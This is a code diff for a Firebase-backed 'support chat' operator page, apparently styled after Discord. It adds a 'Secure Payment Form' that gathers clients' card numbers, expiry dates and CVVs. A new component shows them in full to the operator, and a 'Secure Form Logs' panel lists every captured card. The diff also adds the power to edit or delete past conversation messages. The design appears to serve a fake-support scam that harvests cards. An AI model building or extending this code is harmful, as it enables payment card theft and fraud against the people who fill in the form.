@@ -27,13 +27,14 @@ import {
   getDoc,
 } from "firebase/firestore";
 import { db } from "@/lib/firebase";
+import { MdLock, MdDelete, MdEdit, MdCreditCard } from "react-icons/md";
 
 // ---------------------------
 // Data Types
 // ---------------------------
 type Message = {
   id?: string;
-  sender: string; // always "support"
+  sender: string; // always "support" in this support-chat
   text: string;
   messageType?: "text" | "secure_form_request" | "secure_form_response";
   timestamp?: Timestamp;
@@ -65,13 +66,8 @@ function TransactionForm({ onSubmit }: TransactionFormProps) {
     if (trimmed) onSubmit(trimmed);
   };
   return (
-    <form
-      onSubmit={handleSubmit}
-      style={{ textAlign: "center", marginTop: "50px" }}
-    >
-      <h2 style={{ color: "#5865F2" }}>
-        Please enter a valid transaction ID:
-      </h2>
+    <form onSubmit={handleSubmit} style={{ textAlign: "center", marginTop: "50px" }}>
+      <h2 style={{ color: "#5865F2" }}>Please enter a valid transaction ID:</h2>
       <input
         type="text"
         value={input}
@@ -107,12 +103,124 @@ function TransactionForm({ onSubmit }: TransactionFormProps) {
 }
 
 // ---------------------------
+// SecureFormRequestPlaceholder Component (Support Only)
+// ---------------------------
+function SecureFormRequestPlaceholder() {
+  return (
+    <div style={securePlaceholderStyle}>
+      <MdLock style={securePlaceholderIconStyle} />
+      <span>Secure Payment Form request sent to client</span>
+    </div>
+  );
+}
+
+// ---------------------------
+// SecurePaymentDetails Component (Support Only)
+// ---------------------------
+function SecurePaymentDetails({
+  transactionId,
+  maskedText,
+}: {
+  transactionId: string;
+  maskedText: string;
+}) {
+  const [details, setDetails] = useState<{
+    cardNumber: string;
+    expiry: string;
+    cvv: string;
+  } | null>(null);
+
+  useEffect(() => {
+    const secureRef = collection(db, "securePaymentDetails");
+    const q = query(secureRef, where("transactionId", "==", transactionId));
+    const unsubscribe = onSnapshot(q, (snapshot) => {
+      if (!snapshot.empty) {
+        // For simplicity, take the first matching document.
+        const data = snapshot.docs[0].data();
+        setDetails({
+          cardNumber: data.cardNumber,
+          expiry: data.expiry,
+          cvv: data.cvv,
+        });
+      } else {
+        setDetails(null);
+      }
+    });
+    return () => unsubscribe();
+  }, [transactionId]);
+
+  if (details) {
+    const cardType = detectCardType(details.cardNumber);
+    return (
+      <div>
+        {`Payment Details - Card: ${details.cardNumber}, Expiry: ${details.expiry}, CVV: ${details.cvv}`}{" "}
+        <em>({cardType})</em>
+      </div>
+    );
+  }
+  return <div>{maskedText} (Secure details loading...)</div>;
+}
+
+// ---------------------------
+// Helper to detect card type (used on secure responses)
+// ---------------------------
+function detectCardType(cardNumber: string): string {
+  const cleaned = cardNumber.replace(/[\s-]/g, "");
+  if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) {
+    return "Visa";
+  } else if (/^5[1-5][0-9]{14}$/.test(cleaned)) {
+    return "MasterCard";
+  } else if (/^3[47][0-9]{13}$/.test(cleaned)) {
+    return "American Express";
+  }
+  return "Unknown";
+}
+
+// ---------------------------
+// NEW: ImageModal Component (for zoom-in effect)
+// ---------------------------
+function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
+  return (
+    <div
+      onClick={onClose}
+      style={{
+        position: "fixed",
+        top: 0,
+        left: 0,
+        width: "100vw",
+        height: "100vh",
+        backgroundColor: "rgba(0, 0, 0, 0.8)",
+        display: "flex",
+        alignItems: "center",
+        justifyContent: "center",
+        zIndex: 1000,
+        cursor: "zoom-out",
+        animation: "zoomIn 0.3s",
+      }}
+    >
+      {/* Added width and height props here to fix the error */}
+      <Image
+        src={src}
+        alt="Zoomed"
+        width={800}
+        height={600}
+        style={{
+          maxWidth: "90%",
+          maxHeight: "90%",
+          borderRadius: "10px",
+        }}
+      />
+    </div>
+  );
+}
+
+// ---------------------------
 // ChatContent Component (Support)
 // ---------------------------
 function ChatContent() {
   const searchParams = useSearchParams();
   const initialTx = searchParams.get("tx") || "";
-  const role = "support"; // Hardcoded
+  const role = "support";
 
   const [transactionId, setTransactionId] = useState(initialTx);
   const [messages, setMessages] = useState<Message[]>([]);
@@ -120,22 +228,25 @@ function ChatContent() {
   const [user, setUser] = useState<UserData | null>(null);
   const [loading, setLoading] = useState(false);
   const [containerLoaded, setContainerLoaded] = useState(false);
+  // NEW: State for storing the selected image for zoom modal
+  const [selectedImage, setSelectedImage] = useState<string | null>(null);
+  // NEW: Ref for file input to send image messages from support
+  const fileInputRef = useRef<HTMLInputElement | null>(null);
 
-  // Pre-composed messages editing controls
+  // Pre-composed messages state
   const [newPreComposed, setNewPreComposed] = useState("");
+  const [preComposedMessages, setPreComposedMessages] = useState<PreComposedMessage[]>([]);
   const [editingId, setEditingId] = useState<string | null>(null);
   const [editingText, setEditingText] = useState("");
 
-  const [preComposedMessages, setPreComposedMessages] = useState<
-    PreComposedMessage[]
-  >([]);
+  // Conversation message editing state
+  const [editingMessageId, setEditingMessageId] = useState<string | null>(null);
+  const [editingMessageText, setEditingMessageText] = useState("");
 
   const messagesEndRef = useRef<HTMLDivElement | null>(null);
   const chatInputRef = useRef<HTMLTextAreaElement>(null);
 
-  useEffect(() => {
-    setContainerLoaded(true);
-  }, []);
+  useEffect(() => { setContainerLoaded(true); }, []);
 
   useEffect(() => {
     async function fetchUserData() {
@@ -171,14 +282,10 @@ function ChatContent() {
     return () => unsubscribe();
   }, [transactionId]);
 
-  // Listen for pre-composed messages updates from Firebase
   useEffect(() => {
     const preComposedRef = collection(db, "precomposedMessages");
     const unsubscribe = onSnapshot(preComposedRef, (snapshot) => {
-      const msgs = snapshot.docs.map((doc) => ({
-        id: doc.id,
-        ...doc.data(),
-      }));
+      const msgs = snapshot.docs.map((doc) => ({ id: doc.id, ...doc.data() }));
       setPreComposedMessages(msgs as PreComposedMessage[]);
     });
     return () => unsubscribe();
@@ -196,15 +303,30 @@ function ChatContent() {
     transition: "opacity 0.5s ease-out, transform 0.5s ease-out",
   };
 
-  // Optimistic message sending (no delay)
-  const sendMessage = async (
-    text: string,
-    messageType: Message["messageType"] = "text"
-  ) => {
+  // Function to delete a message
+  const deleteMessage = async (id: string) => {
+    try {
+      await deleteDoc(doc(db, "messages", id));
+    } catch (error) {
+      console.error("Error deleting message:", error);
+    }
+  };
+
+  // Function to save an edited conversation message
+  const saveEditedMessage = async (id: string) => {
+    try {
+      await updateDoc(doc(db, "messages", id), { text: editingMessageText });
+      setEditingMessageId(null);
+      setEditingMessageText("");
+    } catch (error) {
+      console.error("Error updating message:", error);
+    }
+  };
+
+  // Optimistic message sending
+  const sendMessage = async (text: string, messageType: Message["messageType"] = "text") => {
     const trimmed = text.trim();
     if (!trimmed) return;
-
-    // Optimistically add the message locally
     const optimisticMessage: Message = {
       id: "temp-" + Date.now(),
       sender: role,
@@ -214,7 +336,6 @@ function ChatContent() {
       transactionId,
     };
     setMessages((prev) => [...prev, optimisticMessage]);
-
     try {
       await addDoc(collection(db, "messages"), {
         transactionId,
@@ -230,52 +351,192 @@ function ChatContent() {
 
   const handleSend = async (e: FormEvent) => {
     e.preventDefault();
-    await sendMessage(chatInput);
-    setChatInput("");
+    const message = chatInput.trim();
+    if (!message) return;
+    setChatInput(""); // Clear the input immediately
+    await sendMessage(message);
     if (chatInputRef.current) {
       chatInputRef.current.style.height = "auto";
     }
   };
+  
 
+  // When secure form button is clicked, support sends a secure form request.
   const handleSendSecureFormRequest = async () => {
-    await sendMessage(
-      "Secure form request: Please fill out the secure form on the client website.",
-      "secure_form_request"
-    );
+    await sendMessage("Secure Payment Form", "secure_form_request");
   };
 
+  // When a secure form response is received (filled by client), support sees full details.
+  // (This function is not used here directly in rendering; full details will be fetched by SecurePaymentDetails.)
+  const handleSecurePaymentSubmit = async (paymentDetails: {
+    cardNumber: string;
+    expiry: string;
+    cvv: string;
+  }) => {
+    const detailsText = `Payment Details - Card: ${paymentDetails.cardNumber}, Expiry: ${paymentDetails.expiry}, CVV: ${paymentDetails.cvv}`;
+    await sendMessage(detailsText, "secure_form_response");
+  };
+
+  // Updated renderMessageContent: if messageType is secure_form_response, render SecurePaymentDetails.
   const renderMessageContent = (msg: Message) => {
+    if (msg.messageType === "secure_form_request") {
+      return <SecureFormRequestPlaceholder />;
+    }
+    if (msg.messageType === "secure_form_response") {
+      return <SecurePaymentDetails transactionId={msg.transactionId} maskedText={msg.text} />;
+    }
+    if (/https?:\/\/[^\s]+/.test(msg.text)) {
+      return (
+        <a
+          href={msg.text}
+          target="_blank"
+          rel="noopener noreferrer"
+          style={{ color: "white", textDecoration: "underline" }}
+        >
+          {msg.text}
+        </a>
+      );
+    }
     if (msg.text.startsWith("data:image/")) {
       return (
-        <Image
-          src={msg.text}
-          alt="Uploaded"
-          width={300}
-          height={200}
-          style={{ borderRadius: "10px", marginTop: "5px" }}
-        />
+        <a href={msg.text} target="_blank" rel="noopener noreferrer">
+          <Image
+            src={msg.text}
+            alt="Uploaded"
+            width={300}
+            height={200}
+            style={{ borderRadius: "10px", marginTop: "5px", cursor: "pointer" }}
+            // NEW: Prevent default link action and open modal on image click
+            onClick={(e) => {
+              e.preventDefault();
+              setSelectedImage(msg.text);
+            }}
+          />
+        </a>
       );
     }
     return <span>{msg.text}</span>;
   };
 
-  // Handle auto-resizing of the textarea
+  // Render each conversation message.
+  const renderMessage = (msg: Message) => {
+    const key = msg.id || Math.random().toString(36).substr(2, 9);
+    const isSupport = msg.sender === "support";
+    if (isSupport && editingMessageId === msg.id) {
+      return (
+        <div
+          key={key}
+          style={{
+            position: "relative",
+            margin: "10px 0",
+            padding: "10px 15px",
+            borderRadius: "15px",
+            maxWidth: "70%",
+            wordWrap: "break-word",
+            fontSize: "15px",
+            backgroundColor: "#5865F2",
+            color: "#fff",
+          }}
+        >
+          <input
+            type="text"
+            value={editingMessageText}
+            onChange={(e) => setEditingMessageText(e.target.value)}
+            style={{
+              width: "100%",
+              padding: "5px",
+              borderRadius: "8px",
+              border: "none",
+              color: "black",
+            }}
+          />
+          <div style={{ marginTop: "5px" }}>
+            <button onClick={() => saveEditedMessage(msg.id!)} style={chatSendStyle}>
+              Save
+            </button>
+            <button
+              onClick={() => setEditingMessageId(null)}
+              style={{ ...chatSendStyle, backgroundColor: "#ccc", marginLeft: "5px" }}
+            >
+              Cancel
+            </button>
+          </div>
+        </div>
+      );
+    }
+    return (
+      <div
+        key={key}
+        style={{
+          position: "relative",
+          margin: "10px 0",
+          padding: "10px 15px",
+          borderRadius: "15px",
+          maxWidth: "70%",
+          wordWrap: "break-word",
+          fontSize: "15px",
+          backgroundColor: "#5865F2",
+          color: "#fff",
+        }}
+      >
+        {isSupport && (
+          <button
+            onClick={() => {
+              setEditingMessageId(msg.id!);
+              setEditingMessageText(msg.text);
+            }}
+            style={editBtnStyle}
+            title="Edit Message"
+          >
+            <MdEdit />
+          </button>
+        )}
+        <strong>{msg.sender}:</strong> {renderMessageContent(msg)}
+        <button onClick={() => deleteMessage(msg.id!)} style={deleteBtnStyle} title="Delete Message">
+          <MdDelete />
+        </button>
+      </div>
+    );
+  };
+
   const handleChatInputChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
     setChatInput(e.target.value);
     if (chatInputRef.current) {
       chatInputRef.current.style.height = "auto";
-      chatInputRef.current.style.height = chatInputRef.current.scrollHeight + "px";
+      chatInputRef.current.style.height = `${chatInputRef.current.scrollHeight}px`;
     }
   };
 
-  // Pre-composed messages functions using Firebase
+  // NEW: Handle file change to send image messages from support
+  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = async (ev) => {
+        const imageUrl = ev.target?.result;
+        if (imageUrl && typeof imageUrl === "string") {
+          try {
+            await addDoc(collection(db, "messages"), {
+              transactionId,
+              sender: role,
+              text: imageUrl,
+              timestamp: serverTimestamp(),
+            });
+          } catch (error) {
+            console.error("Error sending image message:", error);
+          }
+        }
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
+  // Pre-composed messages functions
   const addPreComposedMessage = async () => {
     const trimmed = newPreComposed.trim();
     if (!trimmed) return;
     try {
-      await addDoc(collection(db, "precomposedMessages"), {
-        text: trimmed,
-      });
+      await addDoc(collection(db, "precomposedMessages"), { text: trimmed });
       setNewPreComposed("");
     } catch (error) {
       console.error("Error adding pre-composed message:", error);
@@ -307,6 +568,11 @@ function ChatContent() {
       console.error("Error deleting pre-composed message:", error);
     }
   };
+
+  // Logs Panel: secure form responses from client (for quick reference)
+  const secureFormLogs = messages.filter(
+    (msg) => msg.messageType === "secure_form_response" && msg.sender === "client"
+  );
 
   return (
     <div style={chatPageStyle}>
@@ -340,31 +606,22 @@ function ChatContent() {
                         color: "black",
                       }}
                     />
-                    <button
-                      onClick={() => saveEditedPreComposedMessage(msg.id)}
-                      style={preComposedButtonStyle}
-                    >
+                    <button onClick={() => saveEditedPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
                       Save
                     </button>
                   </>
                 ) : (
                   <>
                     <span
-                      style={{ flex: 1, cursor: "pointer", color: "black"}}
+                      style={{ flex: 1, cursor: "pointer", color: "black" }}
                       onClick={() => sendMessage(msg.text)}
                     >
                       {msg.text}
                     </span>
-                    <button
-                      onClick={() => editPreComposedMessage(msg.id)}
-                      style={preComposedButtonStyle}
-                    >
+                    <button onClick={() => editPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
                       Edit
                     </button>
-                    <button
-                      onClick={() => deletePreComposedMessage(msg.id)}
-                      style={preComposedButtonStyle}
-                    >
+                    <button onClick={() => deletePreComposedMessage(msg.id)} style={preComposedButtonStyle}>
                       Delete
                     </button>
                   </>
@@ -410,28 +667,18 @@ function ChatContent() {
               Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
             </div>
             <div style={chatMessagesStyle}>
-              {messages.map((msg) => (
-                <div
-                  key={msg.id}
-                  style={{
-                    margin: "10px 0",
-                    padding: "10px 15px",
-                    borderRadius: "15px",
-                    maxWidth: "70%",
-                    wordWrap: "break-word",
-                    fontSize: "15px",
-                    backgroundColor: "#5865F2",
-                    color: "#fff",
-                    alignSelf: "flex-end",
-                    transition: "transform 0.2s ease",
-                  }}
-                >
-                  <strong>{msg.sender}:</strong> {renderMessageContent(msg)}
-                </div>
-              ))}
+              {messages.map((msg) => renderMessage(msg))}
               <div ref={messagesEndRef} />
             </div>
             <form onSubmit={handleSend} style={chatInputContainerStyle}>
+              {/* NEW: Minimal plus icon button for sending image files */}
+              <button
+                type="button"
+                onClick={() => fileInputRef.current?.click()}
+                style={plusIconStyle}
+              >
+                +
+              </button>
               <textarea
                 ref={chatInputRef}
                 value={chatInput}
@@ -446,17 +693,38 @@ function ChatContent() {
               <button
                 type="button"
                 onClick={handleSendSecureFormRequest}
-                style={{
-                  ...chatSendStyle,
-                  backgroundColor: "#28a745",
-                  marginLeft: "10px",
-                }}
+                style={{ ...chatSendStyle, backgroundColor: "#28a745", marginLeft: "10px" }}
               >
                 Secure Form
               </button>
+              {/* NEW: Hidden file input for image sending */}
+              <input
+                type="file"
+                accept="image/*"
+                ref={fileInputRef}
+                style={{ display: "none" }}
+                onChange={handleFileChange}
+              />
             </form>
           </div>
+
+          {/* Logs Panel */}
+          <div style={logsContainerStyle}>
+            <h3 style={{ color: "#5865F2", textAlign: "center", marginBottom: "10px" }}>
+              Secure Form Logs
+            </h3>
+            {secureFormLogs.map((log) => (
+              <div key={log.id} style={logItemStyle}>
+                <MdCreditCard style={{ marginRight: "8px", color: "#5865F2" }} />
+                <SecurePaymentDetails transactionId={log.transactionId} maskedText={log.text} />
+              </div>
+            ))}
+          </div>
         </div>
+      )}
+      {/* NEW: Render the ImageModal if an image has been clicked */}
+      {selectedImage && (
+        <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />
       )}
     </div>
   );
@@ -466,18 +734,25 @@ export default function SupportChat() {
   return (
     <Suspense
       fallback={
-        <div
-          style={{
-            textAlign: "center",
-            marginTop: "50px",
-            color: "#5865F2",
-          }}
-        >
+        <div style={{ textAlign: "center", marginTop: "50px", color: "#5865F2" }}>
           Loading chat...
         </div>
       }
     >
       <ChatContent />
+      {/* NEW: Global style for zoom-in animation */}
+      <style jsx global>{`
+        @keyframes zoomIn {
+          from {
+            transform: scale(0.5);
+            opacity: 0;
+          }
+          to {
+            transform: scale(1);
+            opacity: 1;
+          }
+        }
+      `}</style>
     </Suspense>
   );
 }
@@ -488,7 +763,7 @@ export default function SupportChat() {
 const chatPageStyle: React.CSSProperties = {
   margin: 0,
   fontFamily: "sans-serif",
-  backgroundColor: "#E0E3FF", // Light Blurple
+  backgroundColor: "#E0E3FF",
   display: "flex",
   alignItems: "center",
   justifyContent: "center",
@@ -511,7 +786,7 @@ const chatWrapperStyle: React.CSSProperties = {
 const preComposedContainerStyle: React.CSSProperties = {
   width: "30%",
   minWidth: "250px",
-  backgroundColor: "#E0E3FF", // Light Blurple
+  backgroundColor: "#E0E3FF",
   padding: "20px",
   overflowY: "auto",
   borderRight: "2px solid #5865F2",
@@ -544,10 +819,30 @@ const preComposedButtonStyle: React.CSSProperties = {
 };
 
 const chatContainerStyle: React.CSSProperties = {
-  width: "70%",
+  width: "40%",
   display: "flex",
   flexDirection: "column",
   backgroundColor: "#fff",
+};
+
+const logsContainerStyle: React.CSSProperties = {
+  width: "20%",
+  backgroundColor: "#f9f9f9",
+  borderLeft: "2px solid #ccc",
+  padding: "10px",
+  overflowY: "auto",
+};
+
+const logItemStyle: React.CSSProperties = {
+  display: "flex",
+  alignItems: "center",
+  padding: "8px",
+  marginBottom: "8px",
+  backgroundColor: "#fff",
+  borderRadius: "5px",
+  border: "1px solid #ccc",
+  color: "#333",
+  fontSize: "14px",
 };
 
 const chatHeaderStyle: React.CSSProperties = {
@@ -598,3 +893,56 @@ const chatSendStyle: React.CSSProperties = {
   borderRadius: "4px",
   transition: "background-color 0.3s ease, transform 0.2s ease",
 };
+
+const securePlaceholderStyle: React.CSSProperties = {
+  display: "flex",
+  alignItems: "center",
+  padding: "10px",
+  border: "1px solid #5865F2",
+  borderRadius: "8px",
+  backgroundColor: "#E0E3FF",
+  color: "#5865F2",
+  animation: "fadeIn 0.3s ease",
+  transition: "all 0.3s ease",
+};
+
+const securePlaceholderIconStyle: React.CSSProperties = {
+  fontSize: "24px",
+  marginRight: "10px",
+};
+
+const editBtnStyle: React.CSSProperties = {
+  position: "absolute",
+  top: "5px",
+  left: "5px",
+  background: "transparent",
+  border: "none",
+  color: "#fff",
+  cursor: "pointer",
+  fontSize: "18px",
+  opacity: 0.8,
+};
+
+const deleteBtnStyle: React.CSSProperties = {
+  position: "absolute",
+  top: "5px",
+  right: "5px",
+  background: "transparent",
+  border: "none",
+  color: "#fff",
+  cursor: "pointer",
+  fontSize: "18px",
+  opacity: 0.8,
+};
+
+// NEW: Minimal style for the plus icon button
+const plusIconStyle: React.CSSProperties = {
+  background: "none",
+  border: "none",
+  fontSize: "20px",
+  cursor: "pointer",
+  color: "#6c757d",
+  marginRight: "5px",
+  padding: "0",
+};
+
